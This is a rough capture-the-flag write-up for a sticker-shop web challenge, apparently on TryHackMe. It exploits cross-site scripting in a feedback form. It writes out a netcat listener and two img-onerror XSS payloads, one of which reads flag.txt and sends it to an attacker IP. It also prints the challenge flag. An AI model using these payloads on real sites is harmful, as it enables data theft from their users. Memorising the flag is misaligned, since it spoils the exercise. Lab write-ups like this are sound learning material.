ROUGH WRITEUP NOT COMPLETE

![image](https://github.com/user-attachments/assets/c3a16a82-63e5-4467-b055-282e5a2316d5)

This CTF is designed around exploiting a cross-site scripitng vulnerablility within the target's website.

## The sticker shop is finally online!

What is the content of flag.txt?

trying to go to the webpage itself is unauthorised

![image](https://github.com/user-attachments/assets/0bffd75c-7c4f-496c-bc18-cbb789c46a2a)

There is a box in feedback to abuse.

![image](https://github.com/user-attachments/assets/e58903a5-a95f-4a97-9d01-8af8565dabe2)

set up a netcat listener on the attacker machine with nc -nvlp 8080

submit a xss attack test to the feedback box:

``` < img src = x onerror="fetch('http://attacker_ip:8080')"/ > ```

This works as follows:

<img src=x> tries to make the website load an image that doesnt exist so it throws an error.

onerror= this is that error and defines what to do when the image fails to load.

fetch= this makes network requests to the IP/URL in the brackets.

All together, the text box is fet a request to open an image that doesnt exist, it cant so it defaults to the error that tells it to send a network request back to the attackers machine. As there is a netcat session listening on the same port, it can recieve a response from the web server, proving there is a vulnerability to be exploited. If there was no reply, it can be taken that the vulnerability was not present.

![image](https://github.com/user-attachments/assets/da4d8e2a-32b4-43d0-8f0c-07709ef530b5)

Knowing this information, I basically fed the question to chatgpt and it provided me a lovely crafted response with additional lines added onto the initial injected code as seen below:

<img src="x" onerror="fetch('http://127.0.0.1:8080/flag.txt').then(r => r.text()).then(r => fetch('http://10.10.239.245:8080/?c=' + r))"/>

This is very similar to the previous injection, but this time taking data from http:IP_ADDR/flag.txt instead. This would work using this method but not when searched on my own device as this is the website doing a lookup for its own material, therefore it will always have access to it. 

This works as Follows:

.then(r => r.text()) = This converts the response to text

.then(r => fetch('http://10.11.116.53:8080/?c=' + r)) = This sends the converted response to the attacker IP who is listening

![image](https://github.com/user-attachments/assets/33c82a30-a34c-49fa-bef4-8f333bb41509)

``` Answer = THM{83789a69074f636f64a38879cfcabe8b62305ee6} ```
